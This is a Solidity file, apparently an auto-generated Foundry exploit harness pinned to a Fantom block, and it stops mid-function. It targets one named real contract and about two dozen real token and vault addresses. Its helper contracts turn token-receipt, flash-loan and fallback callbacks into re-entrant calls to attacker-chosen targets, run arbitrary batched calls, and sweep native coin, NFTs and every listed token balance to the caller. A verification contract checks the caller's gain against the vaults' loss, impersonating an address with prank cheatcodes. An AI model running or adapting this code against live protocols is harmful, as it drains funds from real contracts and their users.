// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Vm {
    struct Log {
        bytes32 topic0;
        bytes32[] topics;
        bytes data;
    }
    struct SignedDelegation {
        uint8 v;
        bytes32 r;
        bytes32 s;
        uint64 nonce;
        address implementation;
    }
    function prank(address msgSender) external;
    function prank(address msgSender, address txOrigin) external;
    function startPrank(address msgSender) external;
    function startPrank(address msgSender, address txOrigin) external;
    function stopPrank() external;
    function assume(bool condition) external pure;
    function recordLogs() external;
    function getRecordedLogs() external returns (Log[] memory);
    function signAndAttachDelegation(address implementation, uint256 privateKey) external returns (SignedDelegation memory);
}
// Audit block pin: 124205427

contract MidframeHelper_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74 {
    address internal _cbTarget;
    bytes4 internal _cbSel;
    uint256 internal _cbDepth;
    uint256 internal _cbMaxDepth;
    bytes internal _cbData;
    address internal _altCbTarget;
    bytes internal _altCbData;
    address internal _nftC;
    uint256 internal _nftId;
    uint256 internal _nftAmt;
    bool internal _nft1155;

    constructor() {
        if (address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).code.length > 0) {
            (bool ok1820, ) = address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).call(
                abi.encodeWithSelector(0x29965a1d, address(this), bytes32(0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b), address(this))
            );
            ok1820;
        }
    }

    function prepareCallback(address targetAddr, bytes4 sel) external {
        _cbTarget = targetAddr;
        _cbSel = sel;
        _cbDepth = 0;
        _cbMaxDepth = 3;
        delete _cbData;
        _altCbTarget = address(0);
        delete _altCbData;
    }

    function prepareCallbackData(address targetAddr, bytes4 sel, bytes calldata data) external {
        _cbTarget = targetAddr;
        _cbSel = sel;
        _cbDepth = 0;
        _cbMaxDepth = 3;
        _cbData = data;
        _altCbTarget = address(0);
        delete _altCbData;
    }

    function prepareAltCallback(address altTarget, bytes calldata altData) external {
        _altCbTarget = altTarget;
        _altCbData = altData;
    }

    function execBatch(address[] calldata tgts, bytes[] calldata cds) external {
        for (uint256 i = 0; i < tgts.length; i++) {
            (bool okB, ) = tgts[i].call(cds[i]);
            okB;
        }
    }

    function execCall(address tgt, bytes calldata data) external {
        (bool okC, ) = tgt.call(data);
        okC;
    }

    function _invokeCallback() internal {
        uint256 maxD = _cbMaxDepth > 0 ? _cbMaxDepth : 1;
        if (_cbDepth < maxD && (_cbTarget != address(0) || _altCbTarget != address(0))) {
            _cbDepth++;
            if (_cbDepth == 1 && _altCbTarget != address(0) && _altCbData.length > 0) {
                (bool okAlt, ) = _altCbTarget.call(_altCbData);
                okAlt;
            } else if (_cbData.length > 0 && _cbTarget != address(0)) {
                (bool okD, ) = _cbTarget.call(_cbData);
                okD;
            } else if (_cbSel != bytes4(0) && _cbTarget != address(0)) {
                (bool ok, ) = _cbTarget.call(abi.encodeWithSelector(_cbSel, uint256(1)));
                if (!ok) {
                    (ok, ) = _cbTarget.call(abi.encodeWithSelector(_cbSel));
                }
                ok;
            }
        }
    }

    function onERC721Received(address, address, uint256 id, bytes calldata) external returns (bytes4) {
        if (_nftC == address(0)) { _nftC = msg.sender; _nftId = id; _nftAmt = 1; _nft1155 = false; }
        _invokeCallback();
        return 0x150b7a02;
    }

    function onERC1155Received(address, address, uint256 id, uint256 val, bytes calldata) external returns (bytes4) {
        if (_nftC == address(0) && val > 0) { _nftC = msg.sender; _nftId = id; _nftAmt = val; _nft1155 = true; }
        _invokeCallback();
        return 0xf23a6e61;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata ids, uint256[] calldata vals, bytes calldata) external returns (bytes4) {
        if (_nftC == address(0) && ids.length > 0 && vals.length > 0 && vals[0] > 0) { _nftC = msg.sender; _nftId = ids[0]; _nftAmt = vals[0]; _nft1155 = true; }
        _invokeCallback();
        return 0xbc197c81;
    }

    function onTransferReceived(address, address, uint256, bytes calldata) external returns (bytes4) {
        _invokeCallback();
        return 0x88a7ca5c;
    }

    function onApprovalReceived(address, uint256, bytes calldata) external returns (bytes4) {
        _invokeCallback();
        return 0x7b04a2d0;
    }

    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external {
        _invokeCallback();
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return 0x1626ba7e;
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) {
        _invokeCallback();
        if (token != address(0)) {
            uint256 repayAmt = amount + fee;
            if (repayAmt > 0) {
                (bool okA, ) = token.call(abi.encodeWithSelector(0x095ea7b3, msg.sender, repayAmt));
                okA;
            }
        }
        return 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;
    }

    receive() external payable { _invokeCallback(); }

    fallback() external payable { _invokeCallback(); }

    function sweepTo(address callerAddr) external returns (address nftC, uint256 nftId, uint256 nftAmt, bool nft1155) {
        if (address(this).balance > 0) {
            (bool ok, ) = payable(callerAddr).call{value: address(this).balance}("");
            ok;
        }
        nftC = _nftC;
        nftId = _nftId;
        nftAmt = _nftAmt;
        nft1155 = _nft1155;
        if (nftC != address(0) && nftAmt > 0) {
            _nftC = address(0);
            _nftAmt = 0;
            if (nft1155) {
                (bool ok1155, ) = nftC.call(abi.encodeWithSelector(0xf242432a, address(this), callerAddr, nftId, nftAmt, ""));
                if (!ok1155) { nftC = address(0); nftAmt = 0; }
            } else {
                (bool ok721, ) = nftC.call(abi.encodeWithSelector(0x42842e0e, address(this), callerAddr, nftId));
                if (!ok721) { nftC = address(0); nftAmt = 0; }
            }
        }
        { (bool okB, bytes memory retB) = address(0xAd84341756Bf337f5a0164515b1f6F993D194E1f).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xAd84341756Bf337f5a0164515b1f6F993D194E1f).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0xe0654C8e6fd4D733349ac7E09f6f23DA256bF475).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xe0654C8e6fd4D733349ac7E09f6f23DA256bF475).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x30872e4fc4edbFD7a352bFC2463eb4fAe9C09086).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x30872e4fc4edbFD7a352bFC2463eb4fAe9C09086).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x1E4F97b9f9F913c46F1632781732927B9019C68b).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x1E4F97b9f9F913c46F1632781732927B9019C68b).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x74b23882a30290451A17c44f4F05243b6b58C76d).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x74b23882a30290451A17c44f4F05243b6b58C76d).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0xdc301622e621166BD8E82f2cA0A26c13Ad0BE355).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xdc301622e621166BD8E82f2cA0A26c13Ad0BE355).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x82f0B8B456c1A451378467398982d4834b6829c1).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x82f0B8B456c1A451378467398982d4834b6829c1).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x2F733095B80A04b38b0D10cC884524a3d09b836a).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x2F733095B80A04b38b0D10cC884524a3d09b836a).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x321162Cd933E2Be498Cd2267a90534A804051b11).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x321162Cd933E2Be498Cd2267a90534A804051b11).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x049d68029688eAbF473097a2fC38ef61633A3C7A).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x049d68029688eAbF473097a2fC38ef61633A3C7A).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0xC59E47b8a9ba04c4E5100Cc5AfEdfDADC9eD94c5).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xC59E47b8a9ba04c4E5100Cc5AfEdfDADC9eD94c5).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
    }
}

contract DelegateCaller7702_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74 {
    function exec7702(address[] calldata tgts, bytes[] calldata cds) external {
        for (uint256 i = 0; i < tgts.length; i++) {
            (bool okD, ) = tgts[i].call(cds[i]);
            okD;
        }
    }
    receive() external payable {}
}

contract CtorProbe_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74 {
    constructor(address[] memory tgts, bytes[] memory cds, address callerAddr) {
        for (uint256 i = 0; i < tgts.length; i++) {
            (bool okC, ) = tgts[i].call(cds[i]);
            okC;
        }
        if (address(this).balance > 0) { (bool okE, ) = payable(callerAddr).call{value: address(this).balance}(""); okE; }
        { (bool okB, bytes memory retB) = address(0xAd84341756Bf337f5a0164515b1f6F993D194E1f).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xAd84341756Bf337f5a0164515b1f6F993D194E1f).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0xe0654C8e6fd4D733349ac7E09f6f23DA256bF475).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xe0654C8e6fd4D733349ac7E09f6f23DA256bF475).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x30872e4fc4edbFD7a352bFC2463eb4fAe9C09086).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x30872e4fc4edbFD7a352bFC2463eb4fAe9C09086).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x1E4F97b9f9F913c46F1632781732927B9019C68b).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x1E4F97b9f9F913c46F1632781732927B9019C68b).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x74b23882a30290451A17c44f4F05243b6b58C76d).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x74b23882a30290451A17c44f4F05243b6b58C76d).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0xdc301622e621166BD8E82f2cA0A26c13Ad0BE355).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xdc301622e621166BD8E82f2cA0A26c13Ad0BE355).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x82f0B8B456c1A451378467398982d4834b6829c1).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x82f0B8B456c1A451378467398982d4834b6829c1).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x2F733095B80A04b38b0D10cC884524a3d09b836a).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x2F733095B80A04b38b0D10cC884524a3d09b836a).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x321162Cd933E2Be498Cd2267a90534A804051b11).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x321162Cd933E2Be498Cd2267a90534A804051b11).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0x049d68029688eAbF473097a2fC38ef61633A3C7A).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0x049d68029688eAbF473097a2fC38ef61633A3C7A).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0xC59E47b8a9ba04c4E5100Cc5AfEdfDADC9eD94c5).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xC59E47b8a9ba04c4E5100Cc5AfEdfDADC9eD94c5).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
        { (bool okB, bytes memory retB) = address(0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74).staticcall(abi.encodeWithSelector(0x70a08231, address(this))); if (okB && retB.length >= 32) { uint256 tb = abi.decode(retB, (uint256)); if (tb > 0) { (bool okT, ) = address(0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74).call(abi.encodeWithSelector(0xa9059cbb, callerAddr, tb)); okT; } } }
    }
}

contract Verify_modeb_clone_fantom_294_6cb34700303b_f8cd39dd1a74 {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address constant TARGET = 0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74;
    address constant TOK_0 = 0xAd84341756Bf337f5a0164515b1f6F993D194E1f;
    address constant TOK_1 = 0xe0654C8e6fd4D733349ac7E09f6f23DA256bF475;
    address constant TOK_2 = 0x30872e4fc4edbFD7a352bFC2463eb4fAe9C09086;
    address constant TOK_3 = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
    address constant TOK_4 = 0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E;
    address constant TOK_5 = 0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8;
    address constant TOK_6 = 0x1E4F97b9f9F913c46F1632781732927B9019C68b;
    address constant TOK_7 = 0x74b23882a30290451A17c44f4F05243b6b58C76d;
    address constant TOK_8 = 0xdc301622e621166BD8E82f2cA0A26c13Ad0BE355;
    address constant TOK_9 = 0x82f0B8B456c1A451378467398982d4834b6829c1;
    address constant TOK_10 = 0x2F733095B80A04b38b0D10cC884524a3d09b836a;
    address constant TOK_11 = 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75;
    address constant TOK_12 = 0x321162Cd933E2Be498Cd2267a90534A804051b11;
    address constant TOK_13 = 0x049d68029688eAbF473097a2fC38ef61633A3C7A;
    address constant TOK_14 = 0xC59E47b8a9ba04c4E5100Cc5AfEdfDADC9eD94c5;
    address constant TOK_15 = 0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74;
    address constant VAULT_0 = 0xf8Cd39A56EfF59883B7cD8b26FF1Ff0c36dD1a74;
    address constant VAULT_1 = 0x30872e4fc4edbFD7a352bFC2463eb4fAe9C09086;
    address constant VAULT_2 = 0x3d3094Aec3b63C744b9fe56397D36bE568faEBdF;
    address constant VAULT_3 = 0x4FE2eA6a1985515259C0e06D348FE8b0c1F9e049;
    address constant VAULT_4 = 0x4fEd0e73f836112029Fb740d5730F0782789C349;
    address constant VAULT_5 = 0x63A03871141D88cB5417f18DD5b782F9C2118b5B;
    address constant VAULT_6 = 0xb681F4928658a8d54bd4773F5B5DEAb35d63c3CF;
    address constant VAULT_7 = 0xB7982A8EB703d1D5e28a294e1f5a3C9a0161F36C;
    address constant VAULT_8 = 0xCc44A1eDC0E8EcC6DF9703Dee4318B3da66b4F70;
    address constant VAULT_9 = 0xe0654C8e6fd4D733349ac7E09f6f23DA256bF475;
    address constant VAULT_10 = 0xC59E47b8a9ba04c4E5100Cc5AfEdfDADC9eD94c5;
    address constant VAULT_11 = 0x07cd6250f3d2897d449f4bdbCf5A5eb2a2AA596F;
    address constant VAULT_12 = 0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52;
    address constant VAULT_13 = 0x2Dd5a62a5D4E4D20622061C823f9648E3078012d;
    address constant VAULT_14 = 0x37115CbFce229F3D65073DD155bc0cb4a39d9454;
    address constant VAULT_15 = 0x50f05B91c5d5718A65A1233683748E98a3428F4b;
    address constant VAULT_16 = 0x9c5f24b1d940D4F9A41d6efaC37E8B4Ee9a39B8A;
    address constant VAULT_17 = 0xc24205B12fB056822b2b2c42B5ee18272A0A8E74;
    address constant VAULT_18 = 0xCd38952cF9df52eF8EB3141a9B88E76dC859845b;
    address constant VAULT_19 = 0xF491e7B69E4244ad4002BC14e878a34207E38c29;
    address constant VAULT_20 = 0xfB4bdDf8059c65FB01628267ecD0C1eAc0c94CFA;

    struct ConservationSnap {
        uint256[17] callerBal;
        uint256[17] vaultBal;
        uint256[17] supply;
        uint256 wnativeBacking;
    }

    event ConservationGain(uint256 sliceIdx, address asset, uint256 callerGain, uint256 vaultLoss, uint256 gasUsed);
    event ConservationSupplyMint(uint256 sliceIdx, address asset, uint256 supplyInc);
    event ConservationBridge(address tokAsset, uint256 tokSpent, address quoteAsset, uint256 quoteBought);
    event ConservationNftGain(uint256 sliceIdx, address nftContract, uint256 tokenId, uint256 amount, bool is1155);
    event ConservationNftBridge(address nft, uint256 tokenId, uint256 nftSpent, bool is1155, address quoteAsset, uint256 quoteBought);
    event ConservationAtomicExit(address originAsset, uint256 tokenId, bool isNft, bool is1155, address quoteAsset, uint256 quoteAmt);

    function _erc20Bal(address token, address who) internal view returns (uint256) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(0x70a08231, who));
        if (ok && ret.length >= 32) {
            return abi.decode(ret, (uint256));
        }
        return 0;
    }

    function _erc20Supply(address token) internal view returns (uint256) {
        (bool ok, bytes memory ret) = token.staticcall(hex"18160ddd");
        if (ok && ret.length >= 32) {
            return abi.decode(ret, (uint256));
        }
        return 0;
    }

    function _erc20Allowance(address token, address owner, address spender) internal view returns (uint256) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(0xdd62ed3e, owner, spender));
        if (ok && ret.length >= 32) {
            return abi.decode(ret, (uint256));
        }
        return 0;
    }

    function _erc20Decimals(address token) internal view returns (uint8) {
        (bool ok, bytes memory ret) = token.staticcall(hex"313ce567");
        if (ok && ret.length >= 32) {
            uint256 d = abi.decode(ret, (uint256));
            if (d <= 77) {
                return uint8(d);
            }
        }
        return 18;
    }

    function _scaleToWei(uint256 amt, uint8 dec) internal pure returns (uint256) {
        if (dec == 18 || amt == 0) {
            return amt;
        }
        if (dec < 18) {
            uint256 factor = 10 ** uint256(18 - dec);
            return amt > type(uint256).max / factor ? type(uint256).max : amt * factor;
        }
        return amt / (10 ** uint256(dec - 18));
    }

    function _scaleFromWei(uint256 weiAmt, uint8 dec) internal pure returns (uint256) {
        if (dec == 18 || weiAmt == 0) {
            return weiAmt;
        }
        if (dec < 18) {
            return weiAmt / (10 ** uint256(18 - dec));
        }
        if (dec - 18 > 77) {
            return type(uint256).max;
        }
        uint256 factor = 10 ** uint256(dec - 18);
        return weiAmt > type(uint256).max / factor ? type(uint256).max : weiAmt * factor;
    }

    function _hasResidualSpenderAllowance(address token, address who) internal view returns (bool) {
        address[14] memory routers;
        routers[0] = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
        routers[1] = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        routers[2] = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        routers[3] = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4;
        routers[4] = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
        routers[5] = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
        routers[6] = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
        routers[7] = 0x2626664c2603336E57B271c5C0b26F421741e481;
        routers[8] = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
        routers[9] = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
        routers[10] = 0xcF77a3Ba9A5CA399B7c97c74d54e5b1Beb874E43;
        routers[11] = 0xa062aE8A9c5e11aaA026fc2670B0D65cCc8B2858;
        routers[12] = 0x1111111254EEB25477B68fb85Ed929f73A960582;
        routers[13] = 0x111111125421cA6dc452d289314280a0f8842A65;
        for (uint256 rIdx = 0; rIdx < 14; rIdx++) {
            if (_erc20Allowance(token, who, routers[rIdx]) > 0) {
                return true;
            }
        }
        return false;
    }

    function _verifyPostCommitSettlement(address token, address who, uint256 expectedAmt) internal returns (uint256) {
        if (who.code.length > 0 || expectedAmt == 0) {
            return 0;
        }
        address sink = address(0x0000000000000000000000000000000000099999);
        if (token == address(0)) {
            if (who.balance < expectedAmt) {
                return 0;
            }
            uint256 natWhoBefore = who.balance;
            uint256 natSinkBefore = sink.balance;
            vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
            (bool okNat, ) = sink.call{value: expectedAmt}("");
            vm.stopPrank();
            if (!okNat) {
                return 0;
            }
            uint256 natWhoAfter = who.balance;
            uint256 natSinkAfter = sink.balance;
            uint256 natDeb = natWhoBefore > natWhoAfter ? (natWhoBefore - natWhoAfter) : 0;
            uint256 natRecv = natSinkAfter > natSinkBefore ? (natSinkAfter - natSinkBefore) : 0;
            uint256 natSettled = natRecv < natDeb ? natRecv : natDeb;
            if (natSettled == 0) {
                return 0;
            }
            return natSettled < expectedAmt ? natSettled : expectedAmt;
        }
        if (_erc20Bal(token, who) < expectedAmt) {
            return 0;
        }
        address[21] memory vaults = _vaultTable();
        for (uint256 vIdx = 0; vIdx < 21; vIdx++) {
            if (_erc20Allowance(token, who, vaults[vIdx]) > 0) {
                return 0;
            }
        }
        if (_hasResidualSpenderAllowance(token, who)) {
            return 0;
        }
        uint256 whoBefore = _erc20Bal(token, who);
        uint256 sinkBefore = _erc20Bal(token, sink);
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        (bool okT, bytes memory retT) = token.call(abi.encodeWithSelector(0xa9059cbb, sink, expectedAmt));
        vm.stopPrank();
        if (!okT || (retT.length > 0 && (retT.length < 32 || !abi.decode(retT, (bool))))) {
            return 0;
        }
        uint256 sinkAfter = _erc20Bal(token, sink);
        uint256 whoAfter = _erc20Bal(token, who);
        uint256 recv = sinkAfter > sinkBefore ? (sinkAfter - sinkBefore) : 0;
        uint256 deb = whoBefore > whoAfter ? (whoBefore - whoAfter) : 0;
        uint256 settled = recv < deb ? recv : deb;
        if (settled == 0) {
            return 0;
        }
        return settled < expectedAmt ? settled : expectedAmt;
    }

    function _satAdd(uint256 x, uint256 y) internal pure returns (uint256) {
        return y > type(uint256).max - x ? type(uint256).max : (x + y);
    }

    function _assetTable() internal pure returns (address[17] memory a) {
        a[0] = address(0);
        a[1] = TOK_0;
        a[2] = TOK_1;
        a[3] = TOK_2;
        a[4] = TOK_3;
        a[5] = TOK_4;
        a[6] = TOK_5;
        a[7] = TOK_6;
        a[8] = TOK_7;
        a[9] = TOK_8;
        a[10] = TOK_9;
        a[11] = TOK_10;
        a[12] = TOK_11;
        a[13] = TOK_12;
        a[14] = TOK_13;
        a[15] = TOK_14;
        a[16] = TOK_15;
    }

    function _vaultTable() internal pure returns (address[21] memory v) {
        v[0] = VAULT_0;
        v[1] = VAULT_1;
        v[2] = VAULT_2;
        v[3] = VAULT_3;
        v[4] = VAULT_4;
